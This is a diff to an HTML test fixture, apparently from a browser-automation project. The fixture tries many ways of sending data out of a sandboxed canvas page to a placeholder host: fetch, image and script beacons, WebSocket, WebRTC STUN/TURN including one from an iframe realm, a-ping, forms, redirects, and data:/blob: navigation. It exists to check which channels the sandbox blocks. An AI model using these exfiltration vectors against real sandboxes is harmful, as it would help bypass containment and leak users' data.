@@ -3,124 +3,151 @@
 <head>
   <meta charset="utf-8">
   <title>Canvas Exfil Fixture</title>
-  <link rel="prefetch" href="http://127.0.0.1:__HTTP_PORT__/prefetch">
-  <link rel="preconnect" href="http://127.0.0.1:__HTTP_PORT__/preconnect">
-  <link rel="dns-prefetch" href="//127.0.0.1:__HTTP_PORT__">
+  <!-- Every vector has a name; the e2e counts listener hits per name (B2 ORTA-2b).
+       HTTP vectors: path /<name> on __HOST__:__HTTP_PORT__. preconnect: own TCP ports.
+       WebRTC: own UDP ports. dns_prefetch*: no local listener can see a DNS lookup. -->
+  <link rel="prefetch" href="http://__HOST__:__HTTP_PORT__/prefetch_static">
+  <link rel="preconnect" href="http://__HOST__:__PCS_PORT__/">
+  <link rel="dns-prefetch" href="//cdpilot-dns-prefetch-static.invalid">
 </head>
 <body>
   <div id="status">running</div>
   <script>
     (function () {
+      var host = '__HOST__';
       var hp = '__HTTP_PORT__';
-      var up = '__UDP_PORT__';
-      var base = 'http://127.0.0.1:' + hp;
+      var base = 'http://' + host + ':' + hp;
       var r = (window.__r = {});
+      // Page-side result per vector; inside the canvas it also goes out as a page event
+      // (type input, action exfil, id <vector>) so the e2e can say what stopped each one.
+      function rep(name, v) {
+        r[name] = v;
+        try {
+          if (typeof window.__cdpilotCanvasEmit === 'function') {
+            window.__cdpilotCanvasEmit(JSON.stringify({
+              type: 'input', action: 'exfil', id: name, data: String(v).slice(0, 200)
+            }));
+          }
+        } catch (e) {}
+      }
+      try {
+        document.addEventListener('securitypolicyviolation', function (e) {
+          rep('csp:' + e.effectiveDirective, String(e.blockedURI).slice(0, 120));
+        });
+      } catch (e) {}
 
-      // 1. fetch
+      // fetch
       try {
         fetch(base + '/fetch', { mode: 'no-cors' }).then(
-          function () { r.fetch = 'ok'; },
-          function (e) { r.fetch = 'blocked:' + e; }
+          function () { rep('fetch', 'ok'); },
+          function (e) { rep('fetch', 'blocked:' + e); }
         );
-      } catch (e) {
-        r.fetch = 'err:' + e;
-      }
+      } catch (e) { rep('fetch', 'err:' + e); }
 
-      // 2. img beacon
+      // img beacon
       try {
         var img = new Image();
-        img.onload = function () { r.img = 'ok'; };
-        img.onerror = function () { r.img = 'blocked'; };
+        img.onload = function () { rep('img', 'ok'); };
+        img.onerror = function () { rep('img', 'error'); };
         img.src = base + '/img';
-      } catch (e) {
-        r.img = 'err:' + e;
-      }
+      } catch (e) { rep('img', 'err:' + e); }
 
-      // 3. external script
+      // external script
       try {
         var sc = document.createElement('script');
-        sc.onload = function () { r.script = 'ok'; };
-        sc.onerror = function () { r.script = 'blocked'; };
+        sc.onload = function () { rep('script', 'ok'); };
+        sc.onerror = function () { rep('script', 'error'); };
         sc.src = base + '/script';
         document.head.appendChild(sc);
-      } catch (e) {
-        r.script = 'err:' + e;
-      }
+      } catch (e) { rep('script', 'err:' + e); }
 
-      // 4. dynamic link prefetch / preconnect / dns-prefetch
-      ['prefetch', 'preconnect', 'dns-prefetch'].forEach(function (rel) {
-        try {
-          var lk = document.createElement('link');
-          lk.rel = rel;
-          lk.href = rel === 'dns-prefetch' ? '//127.0.0.1:' + hp : base + '/' + rel;
-          document.head.appendChild(lk);
-          r[rel] = 'appended';
-        } catch (e) {
-          r[rel] = 'err:' + e;
-        }
-      });
-
-      // 5. <a ping>
+      // dynamic prefetch / preconnect / dns-prefetch
       try {
-        var a = document.createElement('a');
-        a.href = '#ping-anchor';
-        a.ping = base + '/ping';
-        a.textContent = 'ping';
-        document.body.appendChild(a);
-        a.click();
-        r.ping = 'clicked';
-      } catch (e) {
-        r.ping = 'err:' + e;
-      }
+        var lp = document.createElement('link');
+        lp.rel = 'prefetch';
+        lp.href = base + '/prefetch';
+        document.head.appendChild(lp);
+        rep('prefetch', 'appended');
+      } catch (e) { rep('prefetch', 'err:' + e); }
+      try {
+        var lc = document.createElement('link');
+        lc.rel = 'preconnect';
+        lc.href = 'http://' + host + ':__PC_PORT__/';
+        document.head.appendChild(lc);
+        rep('preconnect', 'appended');
+      } catch (e) { rep('preconnect', 'err:' + e); }
+      try {
+        var ld = document.createElement('link');
+        ld.rel = 'dns-prefetch';
+        ld.href = '//cdpilot-dns-prefetch.invalid';
+        document.head.appendChild(ld);
+        rep('dns_prefetch', 'appended');
+      } catch (e) { rep('dns_prefetch', 'err:' + e); }
 
-      // 6. iframe
+      // iframe
       try {
         var ifr = document.createElement('iframe');
         ifr.src = base + '/iframe';
         document.body.appendChild(ifr);
-        r.iframe = 'appended';
-      } catch (e) {
-        r.iframe = 'err:' + e;
-      }
+        rep('iframe', 'appended');
+      } catch (e) { rep('iframe', 'err:' + e); }
 
-      // 7. WebSocket
+      // WebSocket
       try {
-        var ws = new WebSocket('ws://127.0.0.1:' + hp + '/ws');
-        ws.onopen = function () { r.ws = 'open'; ws.close(); };
-        ws.onerror = function () { r.ws = 'blocked'; };
-      } catch (e) {
-        r.ws = 'err:' + e;
-      }
+        var ws = new WebSocket('ws://' + host + ':' + hp + '/ws');
+        ws.onopen = function () { rep('ws', 'open'); ws.close(); };
+        ws.onerror = function () { rep('ws', 'error'); };
+      } catch (e) { rep('ws', 'err:' + e); }
 
-      // 8. WebRTC STUN/TURN UDP
+      // WebRTC: CSP and sandbox do not stop it (B2 ORTA-2c); each vector has its own UDP port.
+      function rtc(name, PC, servers) {
+        try {
+          if (typeof PC !== 'function') { rep(name, 'no-constructor:' + typeof PC); return; }
+          var pc = new PC({ iceServers: servers });
+          pc.createDataChannel('exfil');
+          pc.createOffer().then(function (offer) {
+            return pc.setLocalDescription(offer);
+          }).then(function () {
+            rep(name, 'gathering');
+          }).catch(function (e) { rep(name, 'err:' + e); });
+        } catch (e) { rep(name, 'err:' + e); }
+      }
       try {
-        var pc = new RTCPeerConnection({
-          iceServers: [
-            { urls: 'stun:127.0.0.1:' + up },
-            { urls: 'turn:127.0.0.1:' + up + '?transport=udp', username: 'u', credential: 'p' }
-          ]
-        });
-        pc.createDataChannel('exfil');
-        pc.createOffer().then(function (offer) {
-          return pc.setLocalDescription(offer);
-        }).then(function () {
-          r.webrtc = 'gathering';
-        }).catch(function (e) {
-          r.webrtc = 'err:' + e;
-        });
-      } catch (e) {
-        r.webrtc = 'err:' + e;
-      }
+        rtc('webrtc_stun', window.RTCPeerConnection, [{ urls: 'stun:' + host + ':__UDP_STUN__' }]);
+      } catch (e) { rep('webrtc_stun', 'err:' + e); }
+      try {
+        rtc('webrtc_turn', window.RTCPeerConnection, [{
+          urls: 'turn:' + host + ':__UDP_TURN__?transport=udp', username: 'u', credential: 'p'
+        }]);
+      } catch (e) { rep('webrtc_turn', 'err:' + e); }
+      // A fresh about:blank iframe realm has its own RTCPeerConnection.
+      try {
+        var fr = document.createElement('iframe');
+        document.body.appendChild(fr);
+        var IPC = fr.contentWindow.RTCPeerConnection;
+        rtc('webrtc_iframe', IPC, [{ urls: 'stun:' + host + ':__UDP_IFRAME__' }]);
+      } catch (e) { rep('webrtc_iframe', 'err:' + (e && e.name ? e.name : e)); }
 
-      // 9. window.open
+      // window.open
       try {
         var w = window.open(base + '/window_open');
-        r.window_open = w === null ? 'null' : 'opened';
-      } catch (e) {
-        r.window_open = 'err:' + e;
-      }
+        rep('window_open', w === null ? 'null' : 'opened');
+      } catch (e) { rep('window_open', 'err:' + e); }
 
-      // 10. form submit (40ms), location= (120ms), meta refresh (240ms)
+      // <a ping> on a real hyperlink navigation (a_nav is the navigation itself)
+      setTimeout(function () {
+        try {
+          var a = document.createElement('a');
+          a.href = base + '/a_nav';
+          a.ping = base + '/ping';
+          a.textContent = 'ping';
+          document.body.appendChild(a);
+          a.click();
+          rep('ping', 'clicked');
+        } catch (e) { rep('ping', 'err:' + e); }
+      }, 20);
+
+      // form submit (40ms), location= (120ms), meta refresh (240ms)
       setTimeout(function () {
         try {
           var f = document.createElement('form');
@@ -128,19 +155,15 @@
           f.action = base + '/form';
           document.body.appendChild(f);
           f.submit();
-          r.form = 'submitted';
-        } catch (e) {
-          r.form = 'err:' + e;
-        }
+          rep('form', 'submitted');
+        } catch (e) { rep('form', 'err:' + e); }
       }, 40);
 
       setTimeout(function () {
         try {
           location.href = base + '/location';
-          r.location = 'assigned';
-        } catch (e) {
-          r.location = 'err:' + e;
-        }
+          rep('location', 'assigned');
+        } catch (e) { rep('location', 'err:' + e); }
       }, 120);
 
       setTimeout(function () {
@@ -149,33 +172,28 @@
           m.httpEquiv = 'refresh';
           m.content = '0;url=' + base + '/meta_refresh';
           document.head.appendChild(m);
-          r.meta_refresh = 'appended';
-        } catch (e) {
-          r.meta_refresh = 'err:' + e;
-        }
+          rep('meta_refresh', 'appended');
+        } catch (e) { rep('meta_refresh', 'err:' + e); }
       }, 240);
 
-      // 11. data:, blob:, and about:blank top-level navigation
+      // data: and blob: top-level navigation (the blob page then goes to about:blank after 1.5 s,
+      // so its own fetch is not cancelled by the next navigation on a loaded machine)
       var blobDelay = typeof window.__EXFIL_BLOB_DELAY__ === 'number' ? window.__EXFIL_BLOB_DELAY__ : 1800;
       setTimeout(function () {
         try {
           location.href = 'data:text/html,<script>fetch("' + base + '/data_nav",{mode:"no-cors"})<\/script>';
-          r.data_nav = 'attempted';
-        } catch (e) {
-          r.data_nav = 'err:' + e;
-        }
+          rep('data_nav', 'attempted');
+        } catch (e) { rep('data_nav', 'err:' + e); }
         setTimeout(function () {
           try {
             var blobHtml = '<!doctype html><html><body><script>' +
               'try{fetch("' + base + '/blob_nav",{mode:"no-cors"});}catch(e){}' +
-              'setTimeout(function(){try{location.href="about:blank";}catch(e){}},60);' +
+              'setTimeout(function(){try{location.href="about:blank";}catch(e){}},1500);' +
               '<\/script></body></html>';
             var blob = new Blob([blobHtml], { type: 'text/html' });
             location.href = URL.createObjectURL(blob);
-            r.blob_nav = 'assigned';
-          } catch (e) {
-            r.blob_nav = 'err:' + e;
-          }
+            rep('blob_nav', 'assigned');
+          } catch (e) { rep('blob_nav', 'err:' + e); }
         }, 20);
       }, blobDelay);
     })();
